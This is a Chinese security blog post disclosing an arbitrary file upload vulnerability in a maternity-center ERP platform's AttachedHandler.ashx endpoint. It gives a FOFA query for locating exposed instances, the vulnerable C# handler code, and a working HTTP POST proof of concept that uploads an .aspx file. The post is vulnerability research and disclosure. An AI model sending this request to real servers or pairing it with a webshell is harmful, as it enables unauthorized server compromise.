---
title: "月子会所ERP管理云平台 AttachedHandler.ashx 任意文件上传漏洞"
source: https://mrxn.net/jswz/mamabaohe-AttachedHandler-rce.html
asset_dir: assets/月子会所erp管理云平台-attachedhandler.ashx-任意文件上传漏洞
---

# 月子会所ERP管理云平台 AttachedHandler.ashx 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/25 08:43
* 760浏览
* [0评论](#comment)
* 1小时阅读

深入探索

SQL

数据库

云平台


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

月子会所ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件。月子会所ERP管理云平台的 Page/upload/AttachedHandler.ashx 接口存在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，攻击者可利用该漏洞上传webshell获取服务器权限。

# fofa语法

> `body="月子护理ERP管理平台" || body="妈妈宝盒客户端.rar" || body="Page/Login/Login3.aspx" || app="妈妈宝盒-ERP"`

# 漏洞分析

深入探索

VPN服务

漏洞预警服务

安全研究工具

AttachedHandler 的业务逻辑实现如下

```
public class AttachedHandler : IHttpHandler
{
    //static string UploadPosition = ConfigurationManager.AppSettings["UploadPosition"];//上传位置(0:表示本地服务器,1:表示OOS)
    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "application/json";
        HttpFileCollection flist = context.Request.Files;
        Logging.SaveLog(ELogLayer.UI, "上传文件" + flist);
        var UploadfileURLList = new List<string>();
        string UploadURL = context.Request.QueryString["url"];
        string Type = context.Request.QueryString["Type"];//OA上传的参数,如果该参数不为空,则是小程序中OA上传(OA上传时候会根据参数判断是上传本地还是OOS)
        if (string.IsNullOrEmpty(UploadURL))
        {
            context.Response.Write(JsonConvert.SerializeObject(new { code = 0, info = "所给的上传路径不正确!" }));
            context.Response.End();
        }
        Logging.SaveLog(ELogLayer.UI, "上传路径" + UploadURL);
        Logging.SaveLog(ELogLayer.UI, "Files数量：" + context.Request.Files.Count);
        if (context.Request.Files.Count > 0)
        {
            var basepath = context.Server.MapPath(UploadURL);//绝对路径
            if (!Directory.Exists(basepath))
            {
                Directory.CreateDirectory(basepath);
            }
            for (int i = 0; i < context.Request.Files.Count; i++)
            {
                HttpPostedFile mypost = flist[i];
                string picneme1 = mypost.FileName;
                string tuozhanming = picneme1.Substring(picneme1.LastIndexOf(".")).ToLower();
                string picneme = GetNewName(tuozhanming);
                UploadfileURLList.Add(string.Format("{0}/{1}", UploadURL, picneme));
                if (!string.IsNullOrEmpty(Type))//小程序OA的附件上传
                {
                    string OOSUpload = BRSysPram.GetByName("OOSUpload");//根据参数编码获取系统参数,1表示上传到OOS，其它表示上传本地

                    if (OOSUpload == "1")
                    {
                        System.IO.Stream strem = flist[i].InputStream;//将所要上传文件转换成流
                        OosUpload.PutObjectToOOSByOA(UploadURL.TrimStart('/') + "/", picneme, strem);//上传文件至oos
                    }
                    else //和之前一样直接上传到本地服务器
                    {
                        var strPath = string.Format("{0}/{1}", basepath, picneme);//原图绝对路径
                        mypost.SaveAs(strPath);//保存文件
                        if (tuozhanming == ".png" || tuozhanming == ".jpg" || tuozhanming == ".jepg" || tuozhanming == ".bmp")
                        {
                            var simgpaht = string.Format("{0}/{1}", basepath, "small_" + picneme);//压缩图绝对路径
                            MakeThumbnail(strPath, simgpaht, 120, 120, "DB");//保存压缩文件
                        }
                    }
                }
                else
                {
                    var strPath = string.Format("{0}/{1}", basepath, picneme);//原图绝对路径
                    mypost.SaveAs(strPath);//保存文件
                    if (tuozhanming == ".png" || tuozhanming == ".jpg" || tuozhanming == ".jepg" || tuozhanming == ".bmp")
                    {
                        var simgpaht = string.Format("{0}/{1}", basepath, "small_" + picneme);//压缩图绝对路径
                        MakeThumbnail(strPath, simgpaht, 120, 120, "DB");//保存压缩文件
                    }
                }
                System.Threading.Thread.Sleep(1000);
            }
        }
        context.Response.Write(JsonConvert.SerializeObject(new { code = 200, data = UploadfileURLList }));
        context.Response.End();
    }

    public string GetNewName(string name)
    {
        var _newName = DateTime.UtcNow.ToString("yyyyMMddHHmmss");
        return _newName + new Random().Next(0000000, 9999999) + name;
    }

    #region 生成缩略图
    /// <summary>
    /// 生成缩略图
    /// </summary>
    /// <param name="originalImagePath">源图路径（物理路径）</param>
    /// <param name="thumbnailPath">缩略图路径（物理路径）</param>
    /// <param name="width">缩略图宽度</param>
    /// <param name="height">缩略图高度</param>
    /// <param name="mode">生成缩略图的方式</param>    
    public static void MakeThumbnail(string originalImagePath, string thumbnailPath, int width, int height, string mode)
    {
        System.Drawing.Image originalImage = System.Drawing.Image.FromFile(originalImagePath);
        int towidth = width;
        int toheight = height;
        int x = 0;
        int y = 0;
        int ow = originalImage.Width;
        int oh = originalImage.Height;

        switch (mode)
        {
            case "HW"://指定高宽缩放（可能变形）                
                break;
            case "W"://指定宽，高按比例                    
                toheight = originalImage.Height * width / originalImage.Width;
                break;
            case "H"://指定高，宽按比例
                towidth = originalImage.Width * height / originalImage.Height;
                break;
            case "Cut"://指定高宽裁减（不变形）                
                if ((double)originalImage.Width / (double)originalImage.Height > (double)towidth / (double)toheight)
                {
                    oh = originalImage.Height;
                    ow = originalImage.Height * towidth / toheight;
                    y = 0;
                    x = (originalImage.Width - ow) / 2;
                }
                else
                {
                    ow = originalImage.Width;
                    oh = originalImage.Width * height / towidth;
                    x = 0;
                    y = (originalImage.Height - oh) / 2;
                }
                break;
            case "DB"://等比缩放（不变形，如果高大按高，宽大按宽缩放） 
                if ((double)originalImage.Width / (double)towidth < (double)originalImage.Height / (double)toheight)
                {
                    toheight = height;
                    towidth = originalImage.Width * height / originalImage.Height;
                }
                else
                {
                    towidth = width;
                    toheight = originalImage.Height * width / originalImage.Width;
                }
                break;
            default:
                break;
        }

        //新建一个bmp图片
        System.Drawing.Image bitmap = new System.Drawing.Bitmap(towidth, toheight);

        //新建一个画板
        Graphics g = System.Drawing.Graphics.FromImage(bitmap);

        //设置高质量插值法
        g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.High;

        //设置高质量,低速度呈现平滑程度
        g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighQuality;

        //清空画布并以透明背景色填充
        g.Clear(Color.Transparent);

        //在指定位置并且按指定大小绘制原图片的指定部分
        g.DrawImage(originalImage, new Rectangle(0, 0, towidth, toheight),
            new Rectangle(x, y, ow, oh),
            GraphicsUnit.Pixel);

        try
        {
            //以jpg格式保存缩略图
            bitmap.Save(thumbnailPath, System.Drawing.Imaging.ImageFormat.Png);
        }
        catch (System.Exception e)
        {
            throw e;
        }
        finally
        {
            originalImage.Dispose();
            bitmap.Dispose();
            g.Dispose();
        }
    }
    #endregion
    public bool IsReusable
    {
        get
        {
            return false;
        }
    }
}
```

首先 UploadURL 是必须存在一个目录，否则直接结束流程，其次是不需要进入 `if (!string.IsNullOrEmpty(Type))//小程序OA的附件上传` 处理流程即 Type 为空或者 null 即可，很简单，我们不传参即可，然后就是常规的重命名、对图片后缀进行缩略图处理等，并无特殊后缀过滤，且会回显上传文件路径，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /Page/upload/AttachedHandler.ashx?url=/ HTTP/1.1
Host: mamabaohe.mrxn.net
Content-Type: multipart/form-data; boundary=--WebKitFormBoundaryWPL35TV23dfr1cNr

--WebKitFormBoundaryWPL35TV23dfr1cNr
Content-Disposition: form-data; name="file"; filename="t.aspx"

<%@Page Language="C#"%><%Response.Write(DateTime.Now.ToString());System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath));%>
--WebKitFormBoundaryWPL35TV23dfr1cNr--
```

[![月子会所ERP管理云平台 AttachedHandler.ashx 任意文件上传漏洞](images/img-001-4204fa09c9a9.webp)](https://image.mrxn.net/104aed4dcd7d48a1ac99a3b3661b3d2d.webp)

成功上传测试POC并回显文件路径

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.fofa语法](#toc-2-)
* [3.漏洞分析](#toc-3-)
* [4.漏洞复现](#toc-4-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[月子会所ERP管理云平台 AttachedHandler.ashx 任意文件上传漏洞](https://mrxn.net/jswz/mamabaohe-AttachedHandler-rce.html)  
文章链接：<https://mrxn.net/jswz/mamabaohe-AttachedHandler-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/mamabaohe-AttachedHandler-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAK9UlEQVR4AeybjXYjuQqE/c37v/Ouy6S6aYTaP5PEPmeUE1JQFEgWrXicvffP5XL571X77+TLPavE/BnWmi52fc6Zq2hN5jsu57NvbcVOk7lXfA3kWre+P+UEtoFcp3951OrmgQtQ6TbOa1hgzvEZAoe1IGJgK3M/oxOOhcCtj/xs1grNQ2jFySBi54Xis4l71HLdNpBMLv99JzAMBGL6MOJsm34Scr5yEP2y5qd8OK4Fx1jren8w5pT/LoPoDyN2awwD6USL+70T+LGBQDwRfil+Ih0LO078mb1S434Qe4Idaz/HQtfNEPY+M82z/I8N5NmNLH2cwI8NRE+YLJbpf8L+hAHbv/LgyMMY9x2PLESd9jEzCA0E5g4QnGsh4qz5bv/HBvLdG/1X+v3MQP6V0/uB1zkMxNezw9n6ML/KEDkInPXIfLe2Oescd1g1MK4NwdV6CB5wm9sHSNh/pdYaxZu4OMrNrEhv4TCQG7t+vO0EtoEA25MA5/4ju4Xo4afjrMYaiBprIWLA1IDAtu8h+QQB0cd7EbpcvgxCYx4iBkxtCGz7gnN/K7o620Cu/vr+gBP4o8m/amf7d0+Ip6PGsP9Ohl5z1t859xWaq6icDGIdYJMAtydZedmWaBzlZXCsEWe5/L+xdUN8kh+CdwcC8TTAHP1E5NcEoXcOIu405mDUOFcRQgsjzrTeS8aq7WI4ruH6R7SdxhxEX8fCuwORaNnvncA2EIhpQeDZFvyEGCFqYMeac9z1dc7YacxVjeOM1j6DsO8dws89sw+Rhx0fWQtCf6bdBnIm+pDcP7GNNZAPG/MfiGvkK1n3Zz4jRA0EOldrFZ/llM8G9/tZ3/WFqLcGIn5E6xprheYg+jg2SmMzZ5zxykPfT7l1Q3QKH2TbB0OIqT0yWWuMZ68Hoi8EukboOoic4zOE0EJgp1XvbNZA1MD+odQ56x0LIfTOQR8Dkt+sam/k1w/njF/0AdYNORzH+4PtPc